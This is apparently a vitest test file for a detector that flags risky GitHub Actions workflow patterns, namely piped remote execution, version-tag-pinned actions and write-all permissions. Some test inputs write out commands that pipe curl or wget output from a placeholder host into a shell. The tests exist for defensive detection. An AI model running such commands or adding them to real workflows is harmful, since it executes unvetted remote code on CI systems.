import { describe, it, expect } from 'vitest';
import { GithubActionsSignals } from '../../../src/security/signals/github-actions-signals.js';

const detector = new GithubActionsSignals();
const WF = '/project/.github/workflows/ci.yml';

describe('GithubActionsSignals', () => {
  it('language property is "github-actions"', () => {
    expect(detector.language).toBe('github-actions');
  });

  it('ignores files that are not .yml or .yaml', () => {
    expect(detector.detect('/project/README.md', 'permissions: write-all')).toEqual([]);
  });

  it('accepts a .yaml file', () => {
    const signals = detector.detect('/project/.github/workflows/ci.yaml', 'permissions: write-all');
    expect(signals.some(s => s.type === 'write-all-permissions')).toBe(true);
  });

  it('flags a run step piping curl to shell as critical', () => {
    const s = detector.detect(WF, 'steps:\n  - run: curl -sL http://x/i.sh | sh')
      .find(x => x.type === 'piped-remote-exec');
    expect(s).toBeDefined();
    expect(s!.severity).toBe('critical');
    expect(s!.category).toBe('install-script');
  });

  it('flags wget piped to bash', () => {
    const signals = detector.detect(WF, 'steps:\n  - run: wget -O - http://x | bash');
    expect(signals.some(x => x.type === 'piped-remote-exec')).toBe(true);
  });

  it('flags an action pinned only to a version tag as high', () => {
    const s = detector.detect(WF, 'steps:\n  - uses: actions/checkout@v4')
      .find(x => x.type === 'unpinned-action');
    expect(s).toBeDefined();
    expect(s!.severity).toBe('high');
    expect(s!.category).toBe('dependency-confusion');
    expect(s!.content).toBe('actions/checkout@v4');
    expect(s!.description).toContain('actions/checkout@v4');
  });

  it('accepts an action pinned to a 40-char SHA', () => {
    const sha = 'a'.repeat(40);
    const signals = detector.detect(WF, `steps:\n  - uses: actions/checkout@${sha}`);
    expect(signals.some(x => x.type === 'unpinned-action')).toBe(false);
  });

  it('emits one signal per unpinned action', () => {
    const content = 'steps:\n  - uses: actions/checkout@v4\n  - uses: actions/setup-node@v3';
    const signals = detector.detect(WF, content).filter(x => x.type === 'unpinned-action');
    expect(signals).toHaveLength(2);
  });

  it('flags write-all permissions as high', () => {
    const s = detector.detect(WF, 'permissions: write-all')
      .find(x => x.type === 'write-all-permissions');
    expect(s).toBeDefined();
    expect(s!.severity).toBe('high');
    expect(s!.category).toBe('suspicious-metadata');
  });

  it('returns nothing for a hardened workflow', () => {
    const content = `permissions:\n  contents: read\nsteps:\n  - uses: actions/checkout@${'b'.repeat(40)}\n  - run: npm ci`;
    expect(detector.detect(WF, content)).toEqual([]);
  });

  it('records file and language on signals', () => {
    const signals = detector.detect(WF, 'permissions: write-all');
    expect(signals[0].file).toBe(WF);
    expect(signals[0].language).toBe('github-actions');
  });
});
